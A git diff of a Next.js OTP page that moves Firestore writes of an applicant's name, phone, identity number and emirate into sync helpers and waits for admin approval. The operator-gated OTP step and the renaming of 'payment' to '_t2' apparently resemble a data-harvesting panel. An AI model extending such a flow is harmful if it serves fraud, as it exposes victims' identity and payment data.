@@ -4,52 +4,75 @@ import { useRouter } from "next/navigation";
 import StepBar from "@/components/StepBar";
 import { db } from "@/lib/firebase";
 import {
-  collection, addDoc, onSnapshot, doc,
-  serverTimestamp
+  onSnapshot, doc,
 } from "firebase/firestore";
 import { useFormData } from "@/context/FormContext";
-
-function genCode() {
-  return `ESA-${Math.floor(100000 + Math.random() * 900000)}`;
-}
+import {
+  ensureApplicationDoc,
+  generateConfirmationCode,
+  hasRequiredApplicantData,
+  updateApplicationData,
+} from "@/lib/application-sync";
 
 export default function OtpPage() {
   const router = useRouter();
-  const { data, setDocId, setConfirmationCode } = useFormData();
+  const { data, docId, setDocId, confirmationCode, setConfirmationCode, hydrated } =
+    useFormData();
 
   const [saved, setSaved] = useState(false);
   const [dots, setDots]   = useState(0);
 
   const docIdRef = useRef<string | null>(null);
-  const confCode = useRef(genCode());
+  const confCode = useRef(confirmationCode || generateConfirmationCode());
 
-  /* ── Save to Firestore (pays collection) on mount ── */
+  /* ── Ensure application exists and sync OTP stage ── */
   useEffect(() => {
-    const payload = {
-      ownerName:         data.name          || "—",
-      phoneNumber:       data.phone         || "—",
-      identityNumber:    data.id_number     || "—",
-      membership:        data.membership    || "—",
-      emirate:           data.emirate       || "—",
-      delivery_date:     data.delivery_date || "—",
-      country:           "UAE",
-      confirmation_code: confCode.current,
-      status:            "pending_review",
-      currentStep:       "payment",
-      isUnread:          true,
-      createdAt:         serverTimestamp(),
-      updatedAt:         serverTimestamp(),
-    };
+    if (!hydrated) return;
 
-    addDoc(collection(db, "pays"), payload)
-      .then((docRef) => {
-        docIdRef.current = docRef.id;
-        setDocId(docRef.id);
-        setConfirmationCode(confCode.current);
+    if (!hasRequiredApplicantData(data)) {
+      router.replace("/register");
+      return;
+    }
+
+    if (!confirmationCode) {
+      setConfirmationCode(confCode.current);
+    }
+
+    void ensureApplicationDoc({
+      docId,
+      data,
+      confirmationCode: confCode.current,
+      pathname: "/otp",
+      extra: {
+        status: "pending_review",
+        otpStatus: "pending",
+      },
+    })
+      .then(async (resolvedId) => {
+        docIdRef.current = resolvedId;
+        setDocId(resolvedId);
+        await updateApplicationData(resolvedId, {
+          status: "pending_review",
+          otpStatus: "pending",
+          currentStep: "_t2",
+          currentPage: "otp",
+          isUnread: true,
+        });
         setSaved(true);
       })
-      .catch(() => setSaved(true));
-  }, []);
+      .catch((error) => {
+        console.error("Failed to sync OTP stage:", error);
+        setSaved(true);
+      });
+  }, [
+    confirmationCode,
+    data,
+    docId,
+    hydrated,
+    router,
+    setConfirmationCode,
+    setDocId,
+  ]);
 
   /* ── Listen for admin approval from Firestore ── */
   useEffect(() => {
@@ -64,7 +87,7 @@ export default function OtpPage() {
       }
     );
     return () => unsubscribe();
-  }, [saved]);
+  }, [router, saved]);
 
   /* ── Animated dots ── */
   useEffect(() => {
